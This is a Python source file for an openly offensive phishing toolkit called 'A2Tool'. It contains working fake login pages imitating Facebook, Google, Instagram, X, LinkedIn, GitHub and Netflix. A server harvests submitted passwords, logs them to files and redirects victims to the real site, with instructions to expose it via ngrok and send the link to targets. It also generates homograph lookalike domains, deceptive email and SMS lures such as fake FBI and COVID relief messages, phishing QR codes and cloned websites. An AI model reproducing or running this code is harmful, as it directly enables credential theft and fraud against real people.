#!/usr/bin/env python3
# ============================================================
#  A2Tool - Phishing Attacks Framework
# ============================================================

import os, sys, time, socket, threading, webbrowser, json, random, string
from colorama import Fore, Style, init
init(autoreset=True)

R = Fore.RED; G = Fore.GREEN; Y = Fore.YELLOW; B = Fore.BLUE
M = Fore.MAGENTA; C = Fore.CYAN; W = Fore.WHITE; RS = Style.RESET_ALL

OS_NAME = os.name
IS_WINDOWS = OS_NAME == 'nt'

# ────────────────────────────────────────────────────────
# Phishing Page Templates
# ────────────────────────────────────────────────────────
PAGES_DIR = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'phishing_pages')
os.makedirs(PAGES_DIR, exist_ok=True)

TEMPLATES = {
    'facebook': {
        'title': 'Facebook Login',
        'fields': ['email', 'pass'],
        'html': '''
<!DOCTYPE html><html><head><title>Facebook</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Helvetica,Arial,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;height:100vh}
.card{background:#fff;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 16px rgba(0,0,0,.1);padding:20px;width:396px;text-align:center}
.logo{color:#1877f2;font-size:48px;font-weight:bold;margin-bottom:20px}
input{width:100%;padding:14px 16px;font-size:17px;border:1px solid #dddfe2;border-radius:6px;margin-bottom:12px}
button{background:#1877f2;color:#fff;font-size:20px;padding:14px;border:none;border-radius:6px;width:100%;font-weight:bold;cursor:pointer}
button:hover{background:#166fe5}
</style></head><body>
<div class="card">
<div class="logo">facebook</div>
<form method="POST" action="/">
<input type="text" name="email" placeholder="Email or phone number" required>
<input type="password" name="pass" placeholder="Password" required>
<button type="submit">Log In</button>
</form></div></body></html>
'''
    },
    'google': {
        'title': 'Google Sign-In',
        'fields': ['email', 'pass'],
        'html': '''
<!DOCTYPE html><html><head><title>Google Sign-In</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Roboto,Arial,sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;height:100vh}
.card{max-width:450px;padding:48px 40px 36px;border:1px solid #dadce0;border-radius:8px;text-align:center}
.logo{width:75px;height:75px;margin:0 auto 16px}
h1{font-size:24px;margin-bottom:8px}
input{width:100%;padding:13px 15px;font-size:16px;border:1px solid #dadce0;border-radius:4px;margin:8px 0}
button{background:#1a73e8;color:#fff;font-size:14px;padding:9px 24px;border:none;border-radius:4px;float:right;cursor:pointer}
</style></head><body>
<div class="card">
<svg class="logo" viewBox="0 0 48 48"><path fill="#EA4335" d="..."/></svg>
<h1>Sign in</h1>
<p style="color:#5f6368;margin-bottom:24px">Use your Google Account</p>
<form method="POST" action="/">
<input type="text" name="email" placeholder="Email or phone" required>
<input type="password" name="pass" placeholder="Password" required>
<button type="submit">Next</button>
</form></div></body></html>
'''
    },
    'instagram': {
        'title': 'Instagram Login',
        'fields': ['username', 'password'],
        'html': '''
<!DOCTYPE html><html><head><title>Instagram</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#fafafa;display:flex;justify-content:center;align-items:center;height:100vh}
.card{background:#fff;border:1px solid #dbdbdb;border-radius:1px;padding:40px;max-width:350px;text-align:center}
.logo{font-size:36px;font-weight:200;margin-bottom:30px;font-family:cursive}
input{width:100%;padding:9px 8px;font-size:14px;background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;margin-bottom:6px}
button{background:#0095f6;color:#fff;padding:7px 16px;font-size:14px;border:none;border-radius:4px;width:100%;font-weight:600;cursor:pointer}
</style></head><body>
<div class="card">
<div class="logo">Instagram</div>
<form method="POST" action="/">
<input type="text" name="username" placeholder="Phone number, username, or email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form></div></body></html>
'''
    },
    'twitter': {
        'title': 'X / Twitter Login',
        'fields': ['email', 'password'],
        'html': '''
<!DOCTYPE html><html><head><title>X / Twitter</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;height:100vh}
.card{max-width:400px;padding:32px;text-align:center}
.logo{font-size:32px;margin-bottom:32px}
h1{font-size:31px;margin-bottom:32px}
input{width:100%;padding:12px 16px;font-size:17px;border:1px solid #cfd9de;border-radius:4px;margin-bottom:12px}
button{background:#0f1419;color:#fff;padding:12px 16px;font-size:17px;border:none;border-radius:9999px;width:100%;font-weight:bold;cursor:pointer}
</style></head><body>
<div class="card">
<div class="logo">🐦</div>
<h1>Sign in to X</h1>
<form method="POST" action="/">
<input type="text" name="email" placeholder="Phone, email, or username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Next</button>
</form></div></body></html>
'''
    },
    'linkedin': {
        'title': 'LinkedIn Login',
        'fields': ['session_key', 'session_password'],
        'html': '''
<!DOCTYPE html><html><head><title>LinkedIn</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,system-ui,sans-serif;background:#f3f2ef;display:flex;justify-content:center;align-items:center;height:100vh}
.card{background:#fff;border-radius:8px;padding:24px;width:352px;box-shadow:0 4px 12px rgba(0,0,0,0.15)}
.logo{color:#0a66c2;font-size:28px;font-weight:bold;margin-bottom:16px}
input{width:100%;padding:14px 12px;font-size:16px;border:1px solid rgba(0,0,0,0.15);border-radius:4px;margin-bottom:8px}
button{background:#0a66c2;color:#fff;padding:12px 24px;font-size:16px;border:none;border-radius:28px;width:100%;font-weight:600;cursor:pointer}
</style></head><body>
<div class="card">
<div class="logo">LinkedIn</div>
<form method="POST" action="/">
<input type="text" name="session_key" placeholder="Email or phone" required>
<input type="password" name="session_password" placeholder="Password" required>
<button type="submit">Sign in</button>
</form></div></body></html>
'''
    },
    'github': {
        'title': 'GitHub Login',
        'fields': ['login', 'password'],
        'html': '''
<!DOCTYPE html><html><head><title>GitHub</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#f6f8fa;display:flex;justify-content:center;align-items:center;height:100vh}
.card{background:#fff;border:1px solid #d0d7de;border-radius:6px;padding:20px;width:340px}
.logo{text-align:center;font-size:48px;margin-bottom:16px}
h1{font-size:24px;margin-bottom:16px;text-align:center}
input{width:100%;padding:8px 12px;font-size:14px;border:1px solid #d0d7de;border-radius:6px;margin-bottom:16px}
button{background:#2da44e;color:#fff;padding:8px 16px;font-size:14px;border:none;border-radius:6px;width:100%;font-weight:600;cursor:pointer}
</style></head><body>
<div class="card">
<div class="logo">🐙</div>
<h1>Sign in to GitHub</h1>
<form method="POST" action="/">
<input type="text" name="login" placeholder="Username or email address" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in</button>
</form></div></body></html>
'''
    },
    'netflix': {
        'title': 'Netflix Login',
        'fields': ['email', 'password'],
        'html': '''
<!DOCTYPE html><html><head><title>Netflix</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Helvetica,Arial,sans-serif;background:#000;display:flex;justify-content:center;align-items:center;height:100vh;color:#fff}
.card{background:rgba(0,0,0,0.75);padding:60px 68px 40px;border-radius:4px;max-width:450px}
.logo{color:#e50914;font-size:32px;font-weight:bold;margin-bottom:28px}
input{width:100%;padding:14px 16px;font-size:16px;background:#333;border:none;border-radius:4px;color:#fff;margin-bottom:16px}
button{background:#e50914;color:#fff;padding:16px;font-size:16px;border:none;border-radius:4px;width:100%;font-weight:bold;cursor:pointer}
</style></head><body>
<div class="card">
<div class="logo">NETFLIX</div>
<form method="POST" action="/">
<input type="text" name="email" placeholder="Email or phone number" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button>
</form></div></body></html>
'''
    },
    'custom': {
        'title': 'Custom Page',
        'fields': ['username', 'password'],
        'html': '''
<!DOCTYPE html><html><head><title>Login</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Arial,sans-serif;background:linear-gradient(135deg,#667eea,#764ba2);display:flex;justify-content:center;align-items:center;height:100vh}
.card{background:#fff;border-radius:10px;padding:40px;width:350px;box-shadow:0 15px 35px rgba(0,0,0,0.2)}
h2{text-align:center;margin-bottom:24px;color:#333}
input{width:100%;padding:12px 16px;font-size:15px;border:1px solid #ddd;border-radius:6px;margin-bottom:16px}
button{background:#667eea;color:#fff;padding:12px;font-size:16px;border:none;border-radius:6px;width:100%;cursor:pointer}
button:hover{background:#5a67d8}
</style></head><body>
<div class="card">
<h2>Secure Login</h2>
<form method="POST" action="/">
<input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Login</button>
</form></div></body></html>
'''
    }
}

# ────────────────────────────────────────────────────────
# Phishing Server
# ────────────────────────────────────────────────────────
class PhishingServer:
    def __init__(self, template_name, host='0.0.0.0', port=8080):
        self.template = TEMPLATES.get(template_name, TEMPLATES['custom'])
        self.host = host
        self.port = port
        self.server_socket = None
        self.running = False
        self.logs = []
        self.server_thread = None

    def handle_request(self, client_socket):
        try:
            request = client_socket.recv(4096).decode('utf-8', errors='ignore')
            if not request:
                return

            # Parse request
            lines = request.split('\n')
            first_line = lines[0].strip() if lines else ''
            method = first_line.split(' ')[0] if first_line else ''

            # Get client IP
            client_ip = 'Unknown'
            for line in lines:
                if line.lower().startswith('x-forwarded-for:'):
                    client_ip = line.split(':', 1)[1].strip()
                    break
                if line.lower().startswith('host:'):
                    host_val = line.split(':', 1)[1].strip()
                    if ':' in host_val:
                        host_part = host_val.split(':')[0]
                        if host_part != self.host and host_part != 'localhost':
                            client_ip = host_part

            if method == 'POST':
                # Get body
                body_start = request.find('\r\n\r\n')
                if body_start != -1:
                    body = request[body_start+4:]
                    if body:
                        # Parse form data
                        params = {}
                        for pair in body.split('&'):
                            if '=' in pair:
                                key, val = pair.split('=', 1)
                                from urllib.parse import unquote_plus
                                params[key] = unquote_plus(val)

                        ts = time.strftime('%Y-%m-%d %H:%M:%S')
                        log_entry = f"[{ts}] Credentials captured from {client_ip}:"
                        self.logs.append(log_entry)
                        print(f"\n{G}{log_entry}{RS}")
                        for k, v in params.items():
                            print(f"  {Y}{k}: {W}{v}{RS}")
                            self.logs.append(f"  {k}: {v}")

                        # Save to file
                        log_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'phishing_logs')
                        os.makedirs(log_dir, exist_ok=True)
                        log_file = os.path.join(log_dir, f'phish_{time.strftime("%Y%m%d")}.txt')
                        with open(log_file, 'a', encoding='utf-8') as f:
                            f.write(f"\n{'='*50}\n")
                            f.write(f"Time: {ts}\n")
                            f.write(f"Template: {self.template['title']}\n")
                            f.write(f"Client IP: {client_ip}\n")
                            for k, v in params.items():
                                f.write(f"{k}: {v}\n")

                        # Redirect to real site after capture
                        redirect_map = {
                            'facebook': 'https://facebook.com',
                            'google': 'https://google.com',
                            'instagram': 'https://instagram.com',
                            'twitter': 'https://x.com',
                            'linkedin': 'https://linkedin.com',
                            'github': 'https://github.com',
                            'netflix': 'https://netflix.com',
                        }
                        redirect_url = redirect_map.get('facebook', 'https://google.com')
                        response = 'HTTP/1.1 302 Found\r\n'
                        response += f'Location: {redirect_url}\r\n'
                        response += 'Content-Length: 0\r\n\r\n'
                        client_socket.send(response.encode())
                        client_socket.close()
                        return

            # Serve landing page
            html = self.template['html'].encode()
            response = 'HTTP/1.1 200 OK\r\n'
            response += 'Content-Type: text/html; charset=utf-8\r\n'
            response += f'Content-Length: {len(html)}\r\n'
            response += 'Connection: close\r\n\r\n'
            client_socket.send(response.encode() + html)

        except Exception as e:
            print(f"{R}[!] Request error: {e}{RS}")
        finally:
            try:
                client_socket.close()
            except:
                pass

    def start(self):
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            self.running = True
            print(f"\n{G}[+] Phishing server started on {self.host}:{self.port}{RS}")
            print(f"{G}[+] Template: {self.template['title']}{RS}")
            print(f"{Y}[+] Send this link to target: http://YOUR_IP:{self.port}{RS}")
            print(f"{Y}[+] Use ngrok for public URL: ngrok http {self.port}{RS}")
            print(f"{C}[*] Waiting for credentials... (Ctrl+C to stop){RS}\n")

            while self.running:
                client, addr = self.server_socket.accept()
                threading.Thread(target=self.handle_request, args=(client,), daemon=True).start()

        except Exception as e:
            print(f"{R}[!] Server error: {e}{RS}")
        finally:
            self.stop()

    def start_async(self):
        self.server_thread = threading.Thread(target=self.start, daemon=True)
        self.server_thread.start()
        return self.server_thread

    def stop(self):
        self.running = False
        if self.server_socket:
            try:
                self.server_socket.close()
            except:
                pass

    def show_logs(self):
        if not self.logs:
            print(f"{Y}[!] No logs captured yet.{RS}")
        else:
            print(f"\n{C}[*] Captured Logs:{RS}")
            for log in self.logs:
                print(f"  {log}")
        input(f"\n{Y}[+] Press Enter...{RS}")

# ────────────────────────────────────────────────────────
# URL Shortener Spoof
# ────────────────────────────────────────────────────────
def url_spoof():
    """Generate spoofed URLs for phishing."""
    print(f"\n{Y}╔═══════════════════════════════════════════════════════╗")
    print(f"║  {W}URL Spoofing / Homograph Attack Generator{R}          {Y}║")
    print(f"╚═══════════════════════════════════════════════════════╝{RS}")

    real_url = input(f"{Y}  Target domain to spoof (e.g., google.com): {RS}").strip()
    if not real_url:
        return

    # Unicode homograph replacements
    homographs = {
        'a': 'а', 'e': 'е', 'o': 'о', 'p': 'р', 'c': 'с',
        'y': 'у', 'x': 'х', 'i': 'і', 'k': 'к', 'm': 'м',
        'b': 'ь', 'h': 'н', 't': 'т'
    }

    spoofed = ''
    for char in real_url:
        if char in homographs and random.random() > 0.3:
            spoofed += homographs[char]
        else:
            spoofed += char

    print(f"\n{G}[+] Original: {W}{real_url}{RS}")
    print(f"{G}[+] Spoofed:  {W}{spoofed}{RS}")
    print(f"{Y}[!] Note: Modern browsers detect homograph attacks.{RS}")
    input(f"\n{Y}[+] Press Enter...{RS}")

# ────────────────────────────────────────────────────────
# Email Phishing Template
# ────────────────────────────────────────────────────────
def email_phishing():
    """Generate phishing email templates."""
    print(f"\n{Y}╔═══════════════════════════════════════════════════════╗")
    print(f"║  {W}Phishing Email Template Generator{R}                  {Y}║")
    print(f"╚═══════════════════════════════════════════════════════╝{RS}")

    templates = {
        '1': {
            'name': 'Account Verification',
            'subject': 'Action Required: Verify Your Account',
            'body': '''Dear {target},

We detected unusual activity on your account. To continue using our services, please verify your account immediately.

Click here to verify: {phishing_link}

Failure to verify within 24 hours will result in account suspension.

Regards,
Security Team'''
        },
        '2': {
            'name': 'Password Reset',
            'subject': 'Password Reset Request',
            'body': '''Hi {target},

We received a request to reset your password. If you did not make this request, please ignore this email.

Reset your password here: {phishing_link}

This link expires in 1 hour.

Best,
Support Team'''
        },
        '3': {
            'name': 'Invoice / Payment',
            'subject': 'Invoice #{random} - Payment Required',
            'body': '''Dear {target},

Please find attached invoice #{random} for your recent subscription.

View Invoice: {phishing_link}

Thank you for your business.

Regards,
Billing Department'''
        },
        '4': {
            'name': 'Security Alert',
            'subject': 'Security Alert: New Login Detected',
            'body': '''Hi {target},

We noticed a new login to your account from an unrecognized device.

IP Address: {ip}
Location: {location}
Time: {time}

If this was you, you can ignore this alert.
If not, secure your account immediately: {phishing_link}

Stay safe,
Security Team'''
        }
    }

    print(f"\n  {W}Select template:{RS}")
    for k, v in templates.items():
        print(f"  {Y}[{k}]{RS} {v['name']}")

    choice = input(f"\n{Y}  Choice: {RS}").strip()
    tmpl = templates.get(choice)
    if not tmpl:
        print(f"{R}[!] Invalid choice.{RS}")
        return

    target = input(f"{Y}  Target name/email: {RS}").strip() or '{target}'
    phish_link = input(f"{Y}  Phishing URL: {RS}").strip() or '{phishing_link}'
    rand_num = ''.join(random.choices(string.digits, k=6))

    body = tmpl['body'].replace('{target}', target)
    body = body.replace('{phishing_link}', phish_link)
    body = body.replace('{random}', rand_num)
    body = body.replace('{ip}', '192.168.1.1')
    body = body.replace('{location}', 'Unknown City')
    body = body.replace('{time}', time.strftime('%Y-%m-%d %H:%M:%S UTC'))

    print(f"\n{G}[+] Email Template Generated:{RS}")
    print(f"{C}  Subject: {W}{tmpl['subject']}{RS}")
    print(f"{C}  Body:{RS}\n{body}\n")

    save = input(f"{Y}  Save to file? (y/N): {RS}").strip().lower()
    if save == 'y':
        export_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'phishing_emails')
        os.makedirs(export_dir, exist_ok=True)
        fname = f"phish_email_{time.strftime('%Y%m%d_%H%M%S')}.txt"
        with open(os.path.join(export_dir, fname), 'w') as f:
            f.write(f"Subject: {tmpl['subject']}\n\n{body}")
        print(f"{G}[+] Saved to: {export_dir}/{fname}{RS}")

    input(f"\n{Y}[+] Press Enter...{RS}")

# ────────────────────────────────────────────────────────
# SMS Phishing (SMiShing)
# ────────────────────────────────────────────────────────
def sms_phishing():
    """Generate SMS phishing templates."""
    print(f"\n{Y}╔═══════════════════════════════════════════════════════╗")
    print(f"║  {W}SMS Phishing (SMiShing) Template Generator{R}         {Y}║")
    print(f"╚═══════════════════════════════════════════════════════╝{RS}")

    templates = [
        "Your package is on hold. Update delivery info: {link}",
        "Security alert: Unusual login detected. Verify now: {link}",
        "Your account has been compromised. Reset password: {link}",
        "You've won a prize! Claim here: {link}",
        "Urgent: Your Netflix account will be suspended. Update payment: {link}",
        "FBI: Your IP has been linked to cybercrime. Click to clear: {link}",
        "Your PayPal account has been limited. Resolve: {link}",
        "COVID-19 relief payment available. Apply: {link}",
        "Your Amazon order has been cancelled. Review: {link}",
        "FREE Instagram followers! Get them now: {link}"
    ]

    link = input(f"{Y}  Your phishing URL: {RS}").strip()
    print(f"\n{C}[*] Generated SMS Templates:{RS}\n")
    for i, tmpl in enumerate(templates, 1):
        msg = tmpl.replace('{link}', link)
        print(f"  {Y}[{i}]{RS} {msg}\n")

    input(f"\n{Y}[+] Press Enter...{RS}")

# ────────────────────────────────────────────────────────
# QR Code Phishing
# ────────────────────────────────────────────────────────
def qr_phishing():
    """Generate QR code for phishing."""
    print(f"\n{Y}╔═══════════════════════════════════════════════════════╗")
    print(f"║  {W}QR Code Phishing Generator{R}                         {Y}║")
    print(f"╚═══════════════════════════════════════════════════════╝{RS}")

    url = input(f"{Y}  Phishing URL to encode in QR: {RS}").strip()
    if not url:
        return

    try:
        import qrcode
        fname = f"phish_qr_{time.strftime('%Y%m%d_%H%M%S')}.png"
        outpath = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'phishing_pages', fname)
        img = qrcode.make(url)
        img.save(outpath)
        print(f"{G}[+] QR Code saved to: {outpath}{RS}")
        print(f"{G}[+] Open the image and scan with phone to test.{RS}")
    except ImportError:
        print(f"{Y}[!] qrcode module not installed.{RS}")
        print(f"{Y}[!] Install: pip install qrcode[pil]{RS}")
        print(f"{C}[*] QR Data: {url}{RS}")

    input(f"\n{Y}[+] Press Enter...{RS}")

# ────────────────────────────────────────────────────────
# Menu
# ────────────────────────────────────────────────────────
def menu():
    while True:
        os.system('cls' if IS_WINDOWS else 'clear')
        print(f"""{M}
  ╔═══════════════════════════════════════════════════════╗
  ║  {W}A2Tool - Phishing Attacks Framework{R}                  {M}║
  ╠═══════════════════════════════════════════════════════╣
  ║  {W}[1] {R}Start Phishing Server (Local)                     {M}║
  ║  {W}[2] {R}Start Phishing Server with ngrok                  {M}║
  ║  {W}[3] {R}View Captured Credentials Logs                   {M}║
  ║  {W}[4] {R}URL Spoofing / Homograph Attack                  {M}║
  ║  {W}[5] {R}Phishing Email Template Generator                 {M}║
  ║  {W}[6] {R}SMS Phishing (SMiShing) Templates                 {M}║
  ║  {W}[7] {R}QR Code Phishing Generator                       {M}║
  ║  {W}[8] {R}Credential Harvesting Page Editor                 {M}║
  ║  {W}[9] {R}Clone Website (HTTrack Wrapper)                  {M}║
  ║  {W}[10]{R}Spear Phishing Target Analyzer                    {M}║
  ║  {W}[0] {R}Back to Main Menu                                {M}║
  ╚═══════════════════════════════════════════════════════╝
{RS}""")
        choice = input(f"{Y}  A2Tool[Phish] » {RS}").strip()

        if choice == '0':
            break
        elif choice == '1':
            print(f"\n{C}[*] Available Templates:{RS}")
            for i, name in enumerate(TEMPLATES.keys(), 1):
                print(f"  {Y}[{i}]{RS} {name.title()}")
            t_choice = input(f"\n{Y}  Select template (1-{len(TEMPLATES)}): {RS}").strip()

            t_keys = list(TEMPLATES.keys())
            try:
                idx = int(t_choice) - 1
                tmpl = t_keys[idx] if 0 <= idx < len(t_keys) else 'custom'
            except:
                tmpl = 'custom'

            host = input(f"{Y}  Bind address (default 0.0.0.0): {RS}").strip() or '0.0.0.0'
            port = input(f"{Y}  Port (default 8080): {RS}").strip() or '8080'

            server = PhishingServer(tmpl, host, int(port))
            try:
                server.start()
            except KeyboardInterrupt:
                server.stop()
                print(f"\n{Y}[!] Server stopped.{RS}")
            input(f"\n{Y}[+] Press Enter...{RS}")

        elif choice == '2':
            print(f"\n{C}[*] Starting phishing server with ngrok tunnel...{RS}")
            # Check ngrok
            import shutil
            ngrok_path = shutil.which('ngrok')
            if not ngrok_path:
                print(f"{R}[!] ngrok not found in PATH.{RS}")
                print(f"{Y}[!] Download from: https://ngrok.com/download{RS}")
                input(f"\n{Y}[+] Press Enter...{RS}")
                continue

            port = input(f"{Y}  Local port (default 8080): {RS}").strip() or '8080'
            tmpl_name = 'custom'

            server = PhishingServer(tmpl_name, '0.0.0.0', int(port))
            s_thread = server.start_async()
            time.sleep(1)

            print(f"{C}[*] Starting ngrok tunnel...{RS}")
            os.system(f'start cmd /c "ngrok http {port}"' if IS_WINDOWS else f'xterm -e "ngrok http {port}" &')
            print(f"{G}[+] Server running on http://0.0.0.0:{port}{RS}")
            print(f"{G}[+] ngrok tunnel starting in new window.{RS}")
            print(f"{Y}[!] Press Ctrl+C to stop both services.{RS}")

            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                server.stop()
                print(f"\n{Y}[!] Stopped.{RS}")
            input(f"\n{Y}[+] Press Enter...{RS}")

        elif choice == '3':
            log_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'phishing_logs')
            if os.path.isdir(log_dir):
                files = os.listdir(log_dir)
                if files:
                    print(f"\n{C}[*] Log files:{RS}")
                    for f in files:
                        print(f"  {Y}-{RS} {f}")
                    fname = input(f"\n{Y}  Enter filename to view (or Enter for latest): {RS}").strip()
                    if not fname and files:
                        fname = sorted(files)[-1]
                    if fname:
                        try:
                            with open(os.path.join(log_dir, fname), 'r') as f:
                                print(f"\n{G}{f.read()}{RS}")
                        except:
                            print(f"{R}[!] Could not read file.{RS}")
                else:
                    print(f"{Y}[!] No logs captured yet.{RS}")
            else:
                print(f"{Y}[!] No logs captured yet.{RS}")
            input(f"\n{Y}[+] Press Enter...{RS}")

        elif choice == '4': url_spoof()
        elif choice == '5': email_phishing()
        elif choice == '6': sms_phishing()
        elif choice == '7': qr_phishing()
        elif choice == '8':
            print(f"\n{C}[*] Phishing page editor - HTML template customization{RS}")
            print(f"{Y}[!] Edit files in: {PAGES_DIR}{RS}")
            print(f"{Y}[!] Custom templates can be added to TEMPLATES dict in code.{RS}")
            input(f"\n{Y}[+] Press Enter...{RS}")

        elif choice == '9':
            print(f"\n{C}[*] Website Cloning (HTTrack Wrapper){RS}")
            url = input(f"{Y}  URL to clone: {RS}").strip()
            if url:
                outdir = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'cloned_sites')
                os.makedirs(outdir, exist_ok=True)
                cmd = f'httrack "{url}" -O "{outdir}" --mirror --depth=3'
                print(f"{C}[*] Running: {cmd}{RS}")
                os.system(cmd)
            input(f"\n{Y}[+] Press Enter...{RS}")

        elif choice == '10':
            print(f"\n{C}[*] Spear Phishing Target Analyzer{RS}")
            print(f"{Y}[!] Gather intel on target before phishing.{RS}")
            target = input(f"{Y}  Target email/username: {RS}").strip()
            if target:
                print(f"\n{G}[+] Gathering OSINT on {target}...{RS}")
                print(f"{G}[+] Check: https://github.com/sherlock-project/sherlock{RS}")
                print(f"{G}[+] Check: https://haveibeenpwned.com{RS}")
            input(f"\n{Y}[+] Press Enter...{RS}")

        else:
            print(f"{R}[!] Invalid choice.{RS}")
            time.sleep(1)

if __name__ == '__main__':
    menu()
